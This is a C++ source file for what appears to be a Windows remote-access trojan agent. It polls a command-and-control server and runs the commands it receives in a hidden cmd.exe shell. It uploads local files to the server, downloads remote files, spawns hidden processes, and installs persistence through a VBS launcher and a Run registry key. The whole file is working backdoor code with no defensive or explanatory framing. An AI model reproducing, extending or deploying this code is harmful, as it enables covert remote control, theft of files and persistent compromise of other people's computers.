#include "agent.h"
#include "http.h"

using namespace std;


Agent::Agent(const std::string& _server_url, const std::string& _botid, const unsigned int _sleep_interval, const std::string& _service_name, const std::string& _user_agent) {
	if (_botid.empty()) {
		botid = get_hostname();
	}
	else {
		botid = _botid;
	}
	os_name = get_os_name();
	server_url = _server_url;
	sleep_interval = _sleep_interval;
	service_name = _service_name;
	user_agent = _user_agent;
	running = false;
}


string Agent::get_hostname() {
	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD length;
	GetComputerNameA(hostname, &length);
	return hostname;
}


string Agent::get_os_name() {
	string os_name = run_command("ver", true);
	return os_name;
}


string Agent::get_wd() {

	char cwd[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, cwd);

	return cwd;
}


string Agent::get_next_command() {
	std::vector<unsigned char> _cmd = http_request(server_url + "/api/pop?botid=" + botid + "&sysinfo=" + os_name, "GET", NULL, NULL, "", user_agent);

	string cmd(_cmd.begin(), _cmd.end());
    int wchars_num = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
	wchar_t* wstr = new wchar_t[wchars_num];
	MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, wstr, wchars_num);
	char* str = new char[wchars_num];
	wcstombs(str, wstr, wchars_num);
	cmd = string(str);
	delete[] wstr;
	delete[] str;
	return cmd;
}


void Agent::send_output(const std::string& output) {
	string url_encoded = url_encode(output);
	int postSize = strlen("output=") + url_encoded.length() + strlen("&botid=") + botid.length();
	char* postData = new char[postSize + 1];
	sprintf(postData, "output=%s&botid=%s", url_encoded.c_str(), botid.c_str());
	http_request(server_url + "/api/report", "POST", postData, postSize, "Content-Type: application/x-www-form-urlencoded; charset=ISO-8859-1", user_agent);
	delete[] postData;
}


std::string Agent::run_command(const std::string& command, bool isLocal) {

	SECURITY_ATTRIBUTES saAttr;
	HANDLE readOUT = NULL;
	HANDLE writeOUT = NULL;

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	CreatePipe(&readOUT, &writeOUT, &saAttr, 0);

	PROCESS_INFORMATION piProcInfo;
	STARTUPINFOA siStartInfo;

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));

	siStartInfo.cb = sizeof(STARTUPINFO);

		siStartInfo.hStdError = writeOUT;
		siStartInfo.hStdOutput = writeOUT;
		siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	siStartInfo.wShowWindow = SW_HIDE;

	string commandline = "cmd.exe /c " + command;
	CreateProcessA(NULL,
		(LPSTR)commandline.c_str(),
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&siStartInfo,
		&piProcInfo);

	WaitForSingleObject(piProcInfo.hProcess, 10000);

	string cmd_output;
	char cmdBuffer[100];
	DWORD read;

	PeekNamedPipe(readOUT, cmdBuffer, sizeof(cmdBuffer), &read, NULL, NULL);
	while(read) {
		ReadFile(readOUT, cmdBuffer, sizeof(cmdBuffer), &read, NULL);
		cmd_output.append(cmdBuffer, read);
		PeekNamedPipe(readOUT, cmdBuffer, sizeof(cmdBuffer), &read, NULL, NULL);
	}

	int wchars_num = MultiByteToWideChar(CP_OEMCP, 0, cmd_output.c_str(), -1, NULL, 0);
	wchar_t* wstr = new wchar_t[wchars_num];
	MultiByteToWideChar(CP_OEMCP, 0, cmd_output.c_str(), -1, wstr, wchars_num);
	char* str = new char[wchars_num];
	wcstombs(str, wstr, wchars_num);
	cmd_output = string(str);
	delete[] wstr;
	delete[] str;

	CloseHandle(piProcInfo.hThread);
	CloseHandle(piProcInfo.hProcess);

	if (!isLocal && !cmd_output.empty()) {
		send_output(cmd_output);
	}

	return cmd_output;
}

void Agent::help() {
	string help =
		"Available commands\r\n"
		"====================\r\n"
		"You can stack commands with <com1>;<com2>;...\r\n"
		"You can escape \";\" like this: \"\\;\"\r\n\r\n"
		"cd <path>: change directory\r\n"
		"<any shell command>: execute command and return output\r\n"
		"persistence install|clean: install/remove persistent service\r\n"
		"open <calc.exe>: run command asynchronously (no output)\r\n"
		"download <http://url>: download file\r\n"
		"upload <local/file>: upload file\r\n"
		"help: this help\r\n"
		"exit: kill agent\r\n"
		"setinterval <10>: set time interval between each CNC pull\r\n"
		"setservicename <name>: change persistent service name\r\n";
	send_output(help);
}

void Agent::download(const std::string& url) {
	std::vector<unsigned char> resp = http_request(url, "GET", NULL, NULL, "", user_agent);
	if (resp.empty()) {
		send_output("No response while downloading: " + url);
		return;
	}

	string filename = url.substr(url.rfind("/") + 1);
	if (filename.empty()) {
		filename = "downloaded";
	}

	FILE* f = fopen(filename.c_str(), "wb");
	if (f == NULL) {
		send_output("Could not open file for writing: " + filename);
		return;
	}
	fwrite(&resp[0], 1, resp.size(), f);
	fclose(f);

	send_output("Downloaded: " + filename);
}


void Agent::upload(const std::string& filename) {

	string basename = filename.substr(filename.rfind("/") + 1);
	basename = basename.substr(basename.rfind("\\") + 1);

	string boundary = "---------------------------287055381131322";

	string tbody_start =
		"--" + boundary + "\r\n"
		"Content-Disposition: form-data; name=\"botid\"\r\n"
		"\r\n" +
		botid +
		"\r\n"
		"--" + boundary + "\r\n"
		"Content-Disposition: form-data; name=\"uploaded\"; filename=\"" + basename + "\"\r\n"
		"\r\n";
	string tbody_end = "\r\n--" + boundary + "--\r\n";

	FILE* f = fopen(filename.c_str(), "rb");
	if (f == NULL) {
		send_output("Could not open file: " + filename);
		return;
	}
	fseek(f, 0, SEEK_END);
	unsigned long size = ftell(f);
	rewind(f);

	size_t body_size = tbody_start.length() + tbody_end.length() + size;
	char* const bodyPtr = new char[body_size];
	char* body = bodyPtr;
	memcpy(body, tbody_start.c_str(), tbody_start.length());
	body += tbody_start.length();
	fread(body, 1, size, f);
	fclose(f);
	body += size;
	memcpy(body, tbody_end.c_str(), tbody_end.length());

	http_request(server_url + "/api/upload", "POST", bodyPtr, body_size, "Content-Type: multipart/form-data; boundary=" + boundary, user_agent);
	delete[] bodyPtr;
}

void Agent::setInterval(const unsigned int new_interval) {
	sleep_interval = new_interval;
	char buffer[100];
	_itoa(new_interval, buffer, 10);
	send_output("Sleep interval is now " + string(buffer));

}

void Agent::setServiceName(const std::string& new_servicename) {
	service_name = new_servicename;
	send_output("Service name is now " + service_name + ". Run \"persistence clean\" and \"persistence install\" again to apply.");
}

void Agent::open(const std::string& args) {

	PROCESS_INFORMATION piProcInfo;
	STARTUPINFOA siStartInfo;
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.wShowWindow = SW_HIDE;
	
	CreateProcessA(NULL,
		(LPSTR)args.c_str(),
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&siStartInfo,
		&piProcInfo);

	DWORD wait_result = WaitForSingleObject(piProcInfo.hProcess, 10000);

	if (wait_result == WAIT_OBJECT_0) {
		char pid[10];
		_itoa(piProcInfo.dwProcessId, pid, 10);
		send_output("Process created [" + string(pid) + "]");
	}
	else {
		send_output("Failed to launch process \"" + args + "\"");
	}

	CloseHandle(piProcInfo.hThread);
	CloseHandle(piProcInfo.hProcess);
}


void Agent::cd(const std::string& newdir) {

	_chdir(newdir.c_str());

	send_output("Entering " + get_wd());
}


void Agent::persist(const std::string& options) {

	char tempPath[MAX_PATH];
	GetTempPathA(MAX_PATH, tempPath);

	char exePath[MAX_PATH];
	GetModuleFileNameA(NULL, exePath, MAX_PATH);

	string servicePath = tempPath + service_name + ".exe";
	string vbs_path = tempPath + service_name + ".vbs";

	if (options == "install") {
		send_output("Generating VBS file...");
		string vbs =
			"Set oShell = WScript.CreateObject (\"WScript.Shell\")\r\n"
			"oShell.run \"cmd.exe /c " + servicePath + "\", 0\r\n";

		FILE *vbs_file = fopen(vbs_path.c_str(), "wb");
		fwrite(vbs.c_str(), 1, vbs.length(), vbs_file);
		fclose(vbs_file);

		send_output("Adding registrey key...");
		run_command("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v " +
			service_name + " /t REG_SZ /d \\\"" + vbs_path + "\\\"");

		send_output("Copying " + string(exePath) + " to " + servicePath + " ...");
		CopyFileA(exePath, servicePath.c_str(), FALSE);

		send_output("[*] Persistence installed");
	}

	else if (options == "clean") {
		send_output("Adding RunOnce key for executable removal...");
		run_command("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /f /v " +
			service_name + " /t REG_SZ /d \"cmd.exe /c del \\\"" + servicePath + "\\\"");
		send_output("Removing VBS file...");
		run_command(string("del ") + vbs_path.c_str());
		send_output("Removing registrey key...");
		run_command("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v " +
			service_name);
		send_output("[*] Executable will be removed upon next restart");
	}

	else {
		send_output("Usage: persistence install|clean");
	}
}

void Agent::stop() {
	running = false;
}

void Agent::execute(const std::string& commandline) {

	string command = commandline.substr(0, commandline.find(" "));
	string args = commandline.substr(commandline.find(" ") + 1);

	// end process
	if (command == "exit") {
		stop();
	}
	else if (command == "help") {
		help();
	}
	// change working directory
	else if (command == "cd") {
		cd(args);
	}
	// upload a local file to the server
	else if (command == "upload") {
		upload(args);
	}
	// download a file through http
	else if (command == "download") {
		download(args);
	}
	// install / remove persistence
	else if (command == "persistence") {
		persist(args);
	}
	// open a program asynchronously
	else if (command == "open") {
		open(args);
	}
	// interval between each command pull from the CNC
	else if (command == "setinterval") {
		setInterval(atoi(args.c_str()));
	}
	// name of the persistent service
	else if (command == "setservicename") {
		setServiceName(args);
	}
	// if this is a single line, run the command through a shell
	else if (commandline.find("\n") == string::npos) {
		run_command(commandline);
	}
	// else, it's probably an HTML error page so we do nothing
}

void Agent::run() {
	
	running = true;

	while (running) {
		string commandline = get_next_command();

		// nothing to do, checking back later...
		if (commandline.empty()) {
			Sleep(sleep_interval * 1000);
		}
		else {
			size_t found = 0;
			do {
				found = commandline.find(";");
				while (found != string::npos && found != 0 && commandline[found - 1] == '\\') {
					commandline.erase(found - 1, 1);
					found = commandline.find(";", found);
				}
				if (found != string::npos) {		
					string cmd = commandline.substr(0, found);
					commandline.erase(0, found + 1);
					execute(cmd);
				}
				else {
					execute(commandline);
				}
			} while (found != string::npos);
		}
	}
}
